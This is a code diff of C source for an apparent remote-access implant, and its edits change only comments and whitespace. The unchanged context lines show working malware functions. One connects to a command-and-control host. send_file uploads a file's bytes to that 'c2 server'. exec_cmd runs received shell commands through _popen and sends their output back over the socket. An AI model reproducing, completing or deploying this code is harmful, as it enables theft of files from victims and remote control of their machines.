@@ -52,7 +52,7 @@ int c2_connect(SOCKET connect_socket, const char *host, const int port) {
 	return 1;
 }
 
-// Function to copy bytes to new memory location to abide strict aliasing.
+// Function to copy bytes to new memory block/location to abide strict aliasing.
 inline uint32_t ntohl_conv(char const* num) {
 	uint32_t new;
 	memcpy(&new, num, sizeof(new));
@@ -103,9 +103,9 @@ int send_file(char *filename, SOCKET connect_socket, char *buf) {
 	if (!send(connect_socket, (char*)&bytes, sizeof(bytes), 0))
 		return SOCKET_ERROR;
 
-	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
 	int iResult = 1;
 
+	// Recursively read file until EOF is detected and send file bytes to c2 server in BUFLEN chunks.
 	if (f_size) {
 		int bytes_read;
 		while (!feof(fd) && iResult > 0) {
@@ -131,10 +131,10 @@ int exec_cmd(SOCKET connect_socket, char *buf) {
 	strcat(buf, " 2>&1");
     	FILE *fpipe = _popen(buf, "r");
 
-
 	// Read & send pipe's stdout.
 	int rb, iResult = 1;
 	rb = fread(buf, 1, BUFLEN, fpipe);
+
 	if (rb) {
 		do {
 			iResult = send(connect_socket, buf, rb, 0);
